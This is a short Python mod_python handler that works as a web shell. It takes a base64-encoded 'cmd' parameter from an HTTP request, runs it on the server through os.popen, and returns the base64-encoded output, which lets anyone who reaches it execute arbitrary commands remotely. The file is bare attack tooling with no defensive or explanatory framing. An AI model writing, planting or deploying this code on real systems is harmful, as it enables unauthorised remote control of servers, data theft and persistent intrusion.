import os
import base64
from mod_python import apache, util

def main(req):
    try:
        form = util.FieldStorage(req,keep_blank_values=1)
        
        #TODO: handle POST request in mod_python
        #len = int(req.headers_in["content-length"])
        #form_data = req.read(len)

        cmd = base64.b64decode(form['cmd'])
        cmd_result = os.popen(cmd).read()

    except Exception,e:
        cmd_result = str(e)

    return base64.b64encode(cmd_result)